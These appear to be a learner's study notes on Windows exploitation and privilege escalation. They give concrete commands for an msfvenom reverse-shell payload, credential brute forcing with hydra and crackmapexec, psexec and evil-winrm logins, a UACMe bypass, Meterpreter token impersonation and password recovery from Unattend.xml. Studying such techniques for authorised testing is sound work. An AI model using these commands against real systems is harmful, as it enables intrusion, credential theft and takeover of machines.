##### (windows exploitation)

webdav
	(when webav is enable we can put delete anything which is on the website using tools like)
		1==.davtest== - using this we can see what file can be uploaded and what files can be exploited 
		2==.cadaver== - by using this we can put or delete any file 
(we can also get a rev shell using msf but first we need to create a msfvenom payload
and that would be - msfvenom -p windows/meterpreter/reverse_tcp lhost= lport= -f asp > shell.asp | and after uploading it we can open msf and use multi/handler and then we will set that payload we use)(also we just use msf to do all these things auto by using iis upload module )


smb psexec
	(we can do brute force on smb using smb_login module on msf and after getting the creds we can login using psexec.py 
		usage - ==python3/path/psexec.py administrator@123.123.123.123 cmd.ex== | and if we wanna do all that on msf we can use a module called psexec to exploit it)
(it also has eternblue vuln which we can alr do with msf / we can also use windows/psexec module in msf to login)



rdp(3389)
	(sometimes rdp can run on diff port like 3333 or any other port so we can find the rdp using msf rdp_scanner so to connect to rdp we need creds and we can get it using hydra and after getting creds we can connect using ==xfreerdp /u:name /p:pass  /v:<ip>:port== | or we can use remmina to connect ) (there is also another famous vuln called bluekeep(just like eternalblue))


winrm(5985,5986)
	(we need creds to login so we can do bruteforce  by using  a tool called crackmapexec
		usage - ==crackmapexec winrm ip -u administrator -p /path/to/wordlist==  and after than we can connect to winrm using the same tool providing the ip ,username,pass and -x "any command you want to use" )
	(evil-winrm.rb to get complete shell 
		usage - evil-winrm.db -u name -p 'pass' -i ip)
		(to do this all on msf we can use winrm_script module)


Microsoft ftp
	if we see it running it means we can upload anything on the browser with the help of ftp
		if no anonymous then brute force also once logged in we can put the asp rev shell

ssh windows
	we can use brute force here or if it has a vuln we can exploit
 
smb
	we can do eternalblue or brute force attack and then login with psexec.py



##### (windows privesc)

we can check for privesc on msf with module exploit suggester 

##we can also get admin with just getsystem command on meterpreter (only works if you did the whole exploitation phase on msf)

windows exploit suggester 
	(we can use it by saying windows-exploit-suggester --database .xls file --systeminfo txt file (first we need to copy the systeminfo from system and paste it in a txt file for this tool))
		(we can use secwiki github to download various exploit)


# UAC Bypass (with UACMe)

1. **Make msfvenom payload**
    
    - Create a Windows reverse shell payload using `msfvenom`.
        
    - This payload will be used later with UACMe.
        
2. **Start Metasploit listener**
    
    - Open MSF and use `multi/handler`.
        
    - Set payload and start listening for connections.
        
    - This is the _second MSF session_ (for the elevated shell).
        
3. **Use initial shell**
    
    - From the _first MSF session_ (already compromised low-privilege user).
        
    - Go to `C:\` and create a `temp` folder.
        
4. **Upload files**
    
    - Upload the `msfvenom` payload into `C:\temp`.
        
    - Upload `akagi64.exe` (UACMe executable) into `C:\temp`.
        
5. **Run UACMe**
    
    - Usage:
        
        `.\akagi64.exe <method_id> C:\temp\<payload>` ||(id =23)
        
    - Example:
        
        `.\akagi64.exe 23 C:\temp\shell.exe`
        
    - `23` = method ID (check UACMe GitHub for full list).
        
6. **Result**
    
    - Payload runs with elevated privileges (admin token).
        
    - Listener (second MSF) receives an elevated Meterpreter session.

7. (only with msf)
	   - we can get uac through msf module which is called bypassuac_injection to bypass it this is very simple we just need to set target 





# Access Token Impersonation

Check privileges

- In Meterpreter, run `getprivs`.
    
- Look for `SeImpersonatePrivilege` (needed for impersonation).
    

Load incognito

- In Meterpreter, run `load incognito`.
    
- This enables token impersonation commands.
    

List tokens

- Use `list_tokens -u` to see available user tokens.
    

Impersonate a token

- Run `impersonate_token "DOMAIN\\User"` to impersonate a chosen token.
    
- Confirm with `getuid`.
    

If no tokens available

- Use Potato attacks (e.g., JuicyPotato, PrintSpoofer) if `SeImpersonatePrivilege` exists.
- 
[access token impersonation (there are 2 typs of tokens mainly so one is impersonation tokens and the other is delegation tokens with delegation we can pivot || so when we get a meterpreter we can check what prives we have by getprivs and it will show those things there and then we can use load_incognito in meterpreter and then we can use list_tokens -u and then to use any token we can say impersonate_token "token we want" || and if dont see anything on load_incognito we can use the potato attack ) (this will only work when we have SeImpersonatePrivilege]



#Locate Unattend.xml

- Path: `C:\Windows\Panther\Unattend.xml`.
    
- Sometimes left behind after installation.
    

Check for credentials

- Open the file and look for stored passwords (often Base64/encoded).
    
- Extract and decode the password.
    

Gain access with credentials

- Use `psexec` with the recovered password to login as admin.
    

Alternative workflow

- If you already have a shell:
    
    - Navigate to `C:\Windows\Panther\Unattend.xml`.
        
    - Download/copy the file.
        
    - Extract and decode the password locally.
        
    - Reuse with `psexec`.

(or if we got a shell there and we can go to that unattend.xml file and get that file and get the password and crack then login with psexec)


